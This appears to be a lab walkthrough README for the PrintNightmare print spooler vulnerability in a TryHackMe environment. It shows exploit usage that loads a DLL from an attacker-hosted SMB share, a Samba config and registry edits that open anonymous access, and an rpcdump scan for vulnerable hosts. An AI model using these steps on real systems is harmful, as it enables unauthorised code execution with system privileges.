# printnightmare-try-hack-me
A Walkthrough of the PrintNightmare vulnerability utilizing the tryhackme environment 


# INTRODUCTION to CVE-2021-1675 / CVE-2021-34527
This is a post compromise attack that takes advantage of the printer spooler. This basic spooler function runs as system privilege. Because it runs as system privilege, this means that any authenticated attacker can run code execution. Although Microsoft has released a patched to mitigate this attack, many bugs donâ€™t always get patched, and this bug will continue to show up for some time. 



### Installation

Before running the exploit, create a PrintNightmare director (pn) and a share directory. 

```
git clone https://github.com/tryhackme/CVE-2021-1675
```

### CVE-2021-1675.py

```
usage: CVE-2021-1675.py [-h] [-hashes LMHASH:NTHASH] [-target-ip ip address] [-port [destination port]] target share

CVE-2021-1675 implementation.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  share                 Path to DLL. Example '\\10.10.10.10\share\evil.dll'

optional arguments:
  -h, --help            show this help message and exit

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH

connection:
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name
                        and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server

Example;
./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
```

### SMB configuration

Easiest way to host payloads is to use samba and modify `/etc/samba/smb.conf   ` to allow anonymous access

```
[global]
    map to guest = Bad User
    server role = standalone server
    usershare allow guests = yes
    idmap config * : backend = tdb
    smb ports = 445

[smb]
    comment = Samba
    path = /tmp/
    guest ok = yes
    read only = no
    browsable = yes
    force user = smbuser
```

From windows it's also possible

```
mkdir C:\share
icacls C:\share\ /T /grant Anonymous` logon:r
icacls C:\share\ /T /grant Everyone:r
New-SmbShare -Path C:\share -Name share -ReadAccess 'ANONYMOUS LOGON','Everyone'
REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f #This will overwrite existing NullSessionPipes
REG ADD "HKLM\System\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionShares /t REG_MULTI_SZ /d share /f
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f
REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 0 /f
# Reboot
```

### Scanning

We can use `rpcdump.py` from impacket to scan for potential vulnerable hosts, if it returns a value, it could be vulnerable 

```bash
rpcdump.py @192.168.1.10 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol
```
